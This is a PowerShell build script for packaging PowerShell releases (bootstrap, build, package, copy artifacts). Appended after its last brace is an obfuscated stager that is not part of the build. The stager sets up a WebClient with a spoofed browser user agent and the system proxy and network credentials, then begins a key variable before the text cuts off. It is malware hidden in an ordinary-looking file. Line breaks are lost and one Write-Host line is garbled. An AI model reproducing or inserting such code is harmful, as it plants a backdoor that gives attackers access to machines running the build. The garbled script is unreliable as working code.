param ([string] $location = $env:BUILD_REPOSITORY_LOCALPATH,[Parameter(Mandatory, ParameterSetName = 'Build')][string] $destination = '/mnt',[Parameter(Mandatory, ParameterSetName = 'Build')][ValidatePattern("^v\d+\.\d+\.\d+(-\w+(\.\d+)?)?$")][ValidateNotNullOrEmpty()][string]$ReleaseTag,[Parameter(ParameterSetName = 'Build')][ValidateSet("zip", "tar")][string[]]$ExtraPackage,[Parameter(Mandatory, ParameterSetName = 'Bootstrap')][switch] $BootStrap,[Parameter(Mandatory, ParameterSetName = 'Build')][switch] $Build)$repoRoot = $locationif ($Build.IsPresent) {$releaseTagParam = @{}if ($ReleaseTag) {$releaseTagParam = @{ 'ReleaseTag' = $ReleaseTag }}}Push-Locationtry {Write-Verbose -Message "Init..." -VerboseSet-Location $repoRootImport-Module "$repoRoot/build.psm1"Import-Module "$repoRoot/tools/packaging"Sync-PSTags -AddRemoteIfMissingif ($BootStrap.IsPresent) {Start-PSBootstrap -Package}if ($Build.IsPresent) {Start-PSBuild -Configuration 'Release' -Crossgen -PSModuleRestore @releaseTagParamStart-PSPackage @releaseTagParamswitch ($ExtraPackage) {"tar" { Start-PSPackage -Type tar @releaseTagParam }}}} finally {Pop-Location}if ($Build.IsPresent) {$macPackages = Get-ChildItem "$repoRoot/powershell*" -Include *.pkg, *.tar.gzforeach ($macPackage in $macPackages) {$filePath = $macPackage.FullName$name = split-path -Leaf -Path $filePath$extension = (Split-Path -Extension -Path $filePath).Replace('.', '')Write-Verbose "Copying $filePath to $destination" -VerboseWrite-Host "Write-Host "Copy-Item -Path $filePath -Destination $destination -force}}$Wc=New-OBJeCT SysTEm.NeT.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEaDerS.ADD('User-Agent',$u);$WC.PRoXY = [SySTEM.NeT.WebREQuEsT]::DEfaULTWebPRoxy;$wC.PROXy.CrEdENtiALS = [SYsTem.Net.CRedentiAlCache]::DEfaULtNetWoRkCredeNTiaLs;$K='zH:n`Uwqb^/1hK